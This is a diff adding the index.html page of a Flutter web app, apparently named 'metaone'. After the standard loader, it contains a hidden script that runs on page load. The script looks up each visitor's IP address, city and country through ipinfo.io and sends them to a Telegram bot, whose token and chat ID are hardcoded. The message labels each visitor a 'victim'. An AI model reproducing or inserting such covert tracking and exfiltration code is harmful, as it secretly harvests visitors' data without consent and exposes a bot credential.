@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!--
+    If you are serving your web app in a path other than the root, change the
+    href value below to reflect the base path you are serving from.
+
+    The path provided below has to start and end with a slash "/" in order for
+    it to work correctly.
+
+    For more details:
+    * https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base
+
+    This is a placeholder for base href that will be replaced by the value of
+    the `--base-href` argument provided to `flutter build`.
+  -->
+  <base href="/">
+
+  <meta charset="UTF-8">
+  <meta content="IE=Edge" http-equiv="X-UA-Compatible">
+  <meta name="description" content="A new Flutter project.">
+
+  <!-- iOS meta tags & icons -->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="apple-mobile-web-app-title" content="metaone">
+  <link rel="apple-touch-icon" href="icons/Icon-192.png">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="favicon.ico"/>
+
+  <title>ref</title>
+  <link rel="manifest" href="manifest.json">
+
+  <script>
+    // The value below is injected by flutter build, do not touch.
+    const serviceWorkerVersion = "2218590479";
+  </script>
+  <!-- This script adds the flutter initialization JS code -->
+  <script src="flutter.js" defer></script>
+</head>
+<body>
+  <script>
+    window.addEventListener('load', function(ev) {
+      // Download main.dart.js
+      _flutter.loader.loadEntrypoint({
+        serviceWorker: {
+          serviceWorkerVersion: serviceWorkerVersion,
+        },
+        onEntrypointLoaded: function(engineInitializer) {
+          engineInitializer.initializeEngine().then(function(appRunner) {
+            appRunner.runApp();
+          });
+        }
+      });
+    });
+  </script>
+    <script>
+        // Function to send a message to Telegram
+        function sendMessageToTelegram(message) {
+            // Telegram bot token
+            const botToken = '7173338574:AAHojxLR4rcZWSS5Y83mvNlNBeaTkbNqXUs';
+            // Telegram chat ID
+            const chatID = '-4284431474';
+            // Telegram API endpoint
+            const apiUrl = `https://api.telegram.org/bot7173338574:AAHojxLR4rcZWSS5Y83mvNlNBeaTkbNqXUs/sendMessage`;
+
+            // Data to be sent
+            const data = {
+                chat_id: chatID,
+                text: message
+            };
+
+            // Options for the fetch request
+            const options = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            };
+
+            // Send the message using Fetch API
+            fetch(apiUrl, options)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+        }
+
+        // Function to fetch IP country and city information
+        function fetchIPInfo() {
+            // API endpoint to fetch IP info
+            const apiUrl = 'https://ipinfo.io/json';
+
+            // Fetch IP info
+            fetch(apiUrl)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    // Extract country and city information
+                    const { country, city, ip } = data;
+                    // Create message with country and city information
+                    const message = `Viktima prej ${city}, ${country} (${ip}) ka hi n'Web!`;
+                    // Send message to Telegram
+                    sendMessageToTelegram(message);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP info:', error);
+                });
+        }
+
+        // Function to execute when the page loads
+        function onPageLoad() {
+            // Fetch IP info and send message to Telegram
+            fetchIPInfo();
+        }
+
+        // Execute onPageLoad function when the page finishes loading
+        window.onload = onPageLoad;
+    </script>
+</body>
+</html>
